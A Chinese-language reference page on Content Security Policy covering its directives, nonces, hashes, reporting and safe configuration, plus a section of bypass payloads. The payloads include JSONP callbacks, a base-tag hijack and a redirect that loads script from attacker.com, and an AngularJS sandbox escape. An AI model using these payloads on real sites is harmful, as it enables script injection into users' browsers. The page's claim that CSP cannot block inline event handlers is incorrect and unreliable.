# Content Security Policy (CSP)

> **参考：** [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [XSS Prevention](../XSS%20Prevention/XSS%20Prevention.md) | [XSS Payloads](../XSS%20Payloads/XSS%20Payloads.md)

---

## 什么是 CSP？

Content Security Policy（CSP，内容安全策略）是一种浏览器安全机制，旨在减轻 XSS 和其他攻击的影响。它通过 HTTP 响应头或 `<meta>` 标签声明，限制页面可以加载的资源（脚本、样式、图像等），以及页面是否可以被其他页面框架化。

### 启用 CSP

**通过 HTTP 响应头（推荐）：**

```
Content-Security-Policy: default-src 'self'; script-src 'self';
```

**通过 `<meta>` 标签（有限制）：**

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
```

**`<meta>` 标签的限制：**
- 无法使用 `report-uri` 指令
- 无法使用 `frame-ancestors` 指令
- 无法使用 `sandbox` 指令

### CSP 版本演进

| 版本 | 新增特性 |
|------|---------|
| **CSP 1.0** (2012) | 基础指令：`default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `font-src`, `object-src`, `media-src`, `frame-src`, `sandbox`, `report-uri` |
| **CSP 2.0** (2014) | `nonce` 和 `hash` 来源、`base-uri`, `child-src`, `form-action`, `frame-ancestors`, `plugin-types` |
| **CSP 3.0** (2018) | `strict-dynamic`, `unsafe-hashes`, `report-to`, `script-src-elem`, `script-src-attr`, `style-src-elem`, `style-src-attr`, `worker-src`, `manifest-src` |

---

## CSP 指令完整参考

### 资源加载指令（Fetch Directives）

| 指令 | 控制范围 | 默认回退 |
|------|---------|---------|
| `default-src` | 所有资源类型的默认策略 | -- |
| `script-src` | JavaScript 脚本 | `default-src` |
| `style-src` | CSS 样式表 | `default-src` |
| `img-src` | 图像 | `default-src` |
| `connect-src` | XMLHttpRequest、fetch、WebSocket 等网络连接 | `default-src` |
| `font-src` | 字体 | `default-src` |
| `object-src` | `<object>`、`<embed>`、`<applet>` | `default-src` |
| `media-src` | `<audio>`、`<video>` | `default-src` |
| `frame-src` | `<frame>`、`<iframe>`（CSP 1.0） | `default-src` |
| `child-src` | Web Workers 和 `<frame>`、`<iframe>`（CSP 2.0 替代 frame-src）| `default-src` |
| `worker-src` | Web Workers（CSP 3.0） | `child-src` 或 `script-src` 或 `default-src` |
| `manifest-src` | Web App Manifest（CSP 3.0） | `default-src` |
| `script-src-elem` | `<script>` 元素（CSP 3.0） | `script-src` |
| `script-src-attr` | 内联事件处理器（CSP 3.0） | `script-src` |
| `style-src-elem` | `<style>` 和 `<link rel="stylesheet">`（CSP 3.0） | `style-src` |
| `style-src-attr` | 内联 style 属性（CSP 3.0） | `style-src` |

### 导航与文档指令

| 指令 | 控制范围 |
|------|---------|
| `base-uri` | `<base>` 元素的 URL |
| `form-action` | 表单提交的目标 URL |
| `frame-ancestors` | 哪些页面可以框架化当前页面（防御点击劫持） |
| `navigate-to` | 文档导航的目标（实验性） |

### 安全增强指令

| 指令 | 说明 |
|------|------|
| `sandbox` | 对页面应用沙盒限制（类似 `<iframe sandbox>`） |
| `upgrade-insecure-requests` | 将 HTTP 请求升级为 HTTPS |
| `block-all-mixed-content` | 阻止 HTTPS 页面加载 HTTP 资源 |

### 报告指令

| 指令 | 说明 |
|------|------|
| `report-uri` | CSP 1.0 违规报告端点（URL） |
| `report-to` | CSP 3.0 违规报告端点（通过 Reporting API 配置的组名） |

---

## script-src 来源值详解

`script-src` 是防御 XSS 最重要的指令。它的值决定了哪些脚本可以被执行。

### 关键词值

| 值 | 说明 | 安全评估 |
|----|------|---------|
| `'none'` | 不允许任何脚本 | 最安全但不实用 |
| `'self'` | 仅允许同源脚本 | 基本安全，但需注意 JSONP、上传文件等绕过 |
| `'unsafe-inline'` | 允许内联脚本和事件处理器 | 基本等于没有 CSP 的 script 保护 |
| `'unsafe-eval'` | 允许 `eval()` 和相关函数 | 允许 `eval` 注入，显著削弱安全性 |
| `'strict-dynamic'` | 信任通过 nonce/hash 加载的脚本动态创建的脚本 | 配合 nonce/hash 使用，适合现代应用 |
| `'unsafe-hashes'` | 允许通过 hash 匹配内联事件处理器 | CSP 3.0，允许安全地使用事件处理器 |
| `'report-sample'` | 在违规报告中包含违规代码的前 40 个字符 | 辅助调试 |

### Nonce（随机数）

服务器在每个响应中生成一个随机的、不可猜测的 nonce 值，内联脚本必须携带匹配的 nonce 才能执行：

**HTTP 响应头：**

```
Content-Security-Policy: script-src 'nonce-rAnd0m123'
```

**HTML：**

```html
<script nonce="rAnd0m123">
    // 此脚本可以执行
    alert('This is allowed');
</script>

<script>
    // 此脚本被阻止（没有匹配的 nonce）
    alert('This is blocked');
</script>
```

**Nonce 安全要求：**

- 每次页面加载必须生成新的随机 nonce
- Nonce 值必须具有足够的熵（至少 128 位随机性）
- Nonce 不可被缓存（否则攻击者可以预测）
- 使用 Base64 编码的加密安全随机值

### Hash（哈希）

服务器在 CSP 中指定允许的内联脚本内容的加密哈希值。浏览器计算实际脚本的哈希，仅在与策略中的值匹配时才执行：

```
Content-Security-Policy: script-src 'sha256-abc123...'
```

**生成 hash：**

```bash
# 计算脚本内容的 SHA-256 hash
echo -n "alert('Hello');" | openssl dgst -sha256 -binary | openssl base64
```

支持的哈希算法：`sha256-`、`sha384-`、`sha512-`

**Hash 的限制：**
- 脚本内容必须完全匹配（包括空格、换行）
- 任何修改都需要更新 CSP 中的哈希值
- 对动态内容不友好

### strict-dynamic

`'strict-dynamic'` 允许通过 nonce 或 hash 信任的脚本动态创建子脚本。这消除了在页面中包含第三方库时需要显式白名单它们的需要。

```
Content-Security-Policy: script-src 'nonce-rAnd0m123' 'strict-dynamic' 'unsafe-inline' https:
```

当浏览器看到 `'strict-dynamic'` 时：
- 通过 nonce/hash 允许的脚本可以动态添加更多脚本（如 `document.createElement('script')`）
- 主机白名单（如 `https:`）和 `'self'` 被忽略
- `'unsafe-inline'` 被忽略（但为了兼容旧浏览器，通常会同时声明）

---

## CSP Bypass 技术

### 1. JSONP 绕过 `script-src 'self'`

当 CSP 使用 `script-src 'self'` 时，同源的 JSONP（JSON with Padding）端点可以被利用来执行任意 JavaScript。

JSONP 端点接受回调函数名作为参数，并将其用于包裹 JSON 数据：

```
GET /api/data?callback=alert(1)
响应：alert(1)({"data": "value"});
```

如果同源存在 JSONP 端点且回调参数名可控，攻击者可以：

```html
<script src="/api/data?callback=alert(1)"></script>
```

常见 JSONP 端点发现路径：
- 各种 API 端点
- 第三方库（Google APIs、YouTube API）
- CDN 资源

### 2. 文件上传绕过

如果应用程序允许用户上传文件且 `script-src` 包括 `'self'`，攻击者可以上传包含 JavaScript 的文件到同源路径，然后通过 `<script src>` 加载。

### 3. base-uri 缺失导致的相对路径劫持

如果 CSP 中未设置 `base-uri`，攻击者可以通过注入 `<base>` 标签改变相对路径的解析基准：

```html
<base href="https://attacker.com/">
<script src="lib/main.js"></script>  <!-- 现在指向 attacker.com/lib/main.js -->
```

### 4. DOM XSS 绕过 CSP

CSP **不能阻止** DOM XSS 中的非脚本注入。如果页面上存在 DOM XSS，以下 payload 不受 CSP `script-src` 限制：

```html
<img src=x onerror=alert(1)>    <!-- 不加载外部脚本，CSP 不阻止 -->
<svg onload=alert(1)>           <!-- 不加载外部脚本，CSP 不阻止 -->
<iframe src="javascript:alert(1)">  <!-- CSP 不阻止 iframe 中的 javascript: -->
```

Nonce 仅保护静态 `<script nonce=...>` 标签，不保护 DOM 注入创建的内联事件处理器。

### 5. AngularJS 绕过

如果 CSP 包含 `'unsafe-eval'`（或允许加载 AngularJS 库），可以使用 AngularJS sandbox 逃逸执行代码：

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js"></script>
<div ng-app>
    {{constructor.constructor('alert(1)')()}}
</div>
```

### 6. 策略注入（Policy Injection）

如果应用程序将用户输入反射到 CSP 头中（最常见于 `report-uri` 指令），可以注入额外的指令来破坏现有策略。

**场景：** 应用程序反射 URL 参数到 `report-uri`：

```
Content-Security-Policy: default-src 'self'; report-uri /report?url=https://user-input
```

攻击者注入分号来添加自己的指令：

```
https://site.com/page?url=https://site.com; script-src 'unsafe-inline'
```

结果 CSP：

```
Content-Security-Policy: default-src 'self'; report-uri /report?url=https://site.com; script-src 'unsafe-inline'
```

**利用 script-src-elem 覆盖 script-src：** Chrome 的 `script-src-elem` 指令（CSP 3.0）会覆盖 `script-src` 对 `<script>` 元素的行为。如果攻击者能注入此指令，可以绕过现有的 `script-src` 限制。

### 7. CDN 白名单滥用

如果 CSP 允许来自 CDN（如 `https://cdnjs.cloudflare.com`）的脚本，攻击者可能利用以下资源：

- 托管在 CDN 上的旧版本 AngularJS（含已知 sandbox 逃逸）
- 托管在 CDN 上的 JSONP 端点变体
- 任何接受用户内容并返回 JavaScript 的 CDN 端点

### 8. path 绕过

如果 CSP 使用 `https://trusted.com/scripts/` 而非 `https://trusted.com`，且 `trusted.com/scripts/` 下存在开放重定向或 JSONP 端点，可以绕过：

```
# CSP 设置
script-src https://trusted.com/scripts/

# 绕过：如果 /scripts/redirect?url= 存在开放重定向
<script src="https://trusted.com/scripts/redirect?url=https://attacker.com/xss.js">
```

---

## CSP for Clickjacking Prevention

CSP 提供了比 `X-Frame-Options` 更灵活的点击劫持防御。

```
frame-ancestors 'self'
frame-ancestors 'none'
frame-ancestors 'self' https://trusted-site.com https://*.trusted.com
```

| 特性 | X-Frame-Options | CSP frame-ancestors |
|------|----------------|---------------------|
| 多个域名 | 不支持 | 支持 |
| 通配符子域名 | 不支持 | 支持（`*.example.com`） |
| 嵌套框架检查 | 仅顶层 | 所有层级 |
| 浏览器支持 | 全部 | 现代浏览器 |

**最佳实践：** 同时使用 CSP `frame-ancestors` 和 `X-Frame-Options`，以确保对不支持 CSP 的旧浏览器的兼容。

---

## CSP 报告机制

### report-uri (CSP 1.0/2.0)

```
Content-Security-Policy: default-src 'self'; report-uri /csp-report
```

浏览器以 JSON 格式 POST 违规报告：

```json
{
    "csp-report": {
        "document-uri": "https://site.com/page",
        "violated-directive": "script-src 'self'",
        "blocked-uri": "https://attacker.com/xss.js",
        "original-policy": "default-src 'self'; report-uri /csp-report"
    }
}
```

### report-to (CSP 3.0)

使用 Reporting API 配置：

```
Report-To: {"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"/csp-report"}]}
Content-Security-Policy: default-src 'self'; report-to csp-endpoint
```

### Report-Only 模式

用于非侵入式测试，不实际阻止违规行为，仅报告：

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

**关键用途：** 在部署新策略前，先使用 `Report-Only` 模式收集违规报告，了解策略对实际流量的影响，调整后再启用强制模式。

---

## 安全 CSP 配置指南

### 起步策略

```
Content-Security-Policy:
    default-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
```

这是最安全的起步策略：资源仅从同源加载，禁止 `<object>`/`<embed>`（常见漏洞载体），保护 base URI 和表单目标，禁止页面被框架化。

### 现代应用的非侵入式策略

对于需要使用内联脚本和第三方资源的现代应用：

```
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{random}' 'strict-dynamic';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.example.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    report-uri /csp-report;
```

### 配置要点

| 要点 | 说明 |
|------|------|
| **从不使用 `'unsafe-inline'`（在 script-src 中）** | 除非同时使用 nonce/hash（旧浏览器回退） |
| **从不使用 `'unsafe-eval'`** | 如果必须使用，确保 eval 的输入不会被攻击者控制 |
| **始终设置 `object-src 'none'`** | `<object>` / `<embed>` 是常见攻击向量 |
| **始终设置 `base-uri`** | 防止 `<base>` 标签注入进行相对路径劫持 |
| **避免使用通配符 `*`** | `*` 允许任何来源，完全破坏 CSP 的安全性 |
| **谨慎使用 CDN 白名单** | 仅信任已知不会托管恶意代码的 CDN |
| **Nonce 每次请求生成新值** | 不可重用、不可缓存、不可预测 |
| **使用 Report-Only 测试新策略** | 在部署前验证策略不会破坏应用功能 |

---

## CSP 常见问题

| 问题 | 答案 |
|------|------|
| CSP 能否完全阻止 XSS？ | 不能。CSP 是最后一道防线，可以减轻但不能完全阻止 XSS。DOM XSS 中的事件处理器不加载外部脚本，CSP 无法阻止。正确的输出编码才是根本解决方案。 |
| Nonce 和 Hash 哪个更好？ | Nonce 更灵活（适合动态内容），Hash 更适合静态内容。两者可以组合使用。`'strict-dynamic'` 配合 nonce 是现代推荐的做法。 |
| CSP 是否影响性能？ | 极小。Nonce 生成、Hash 计算都是轻量操作。CSP 违规报告的发送是异步的。 |
| `X-XSS-Protection` 还需要吗？ | 不需要。此头已废弃，现代浏览器不再支持其基于反射检测的 XSS 过滤。使用 CSP 替代。 |

---

> **参考：** [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [XSS Prevention](../XSS%20Prevention/XSS%20Prevention.md) | [XSS Payloads](../XSS%20Payloads/XSS%20Payloads.md)
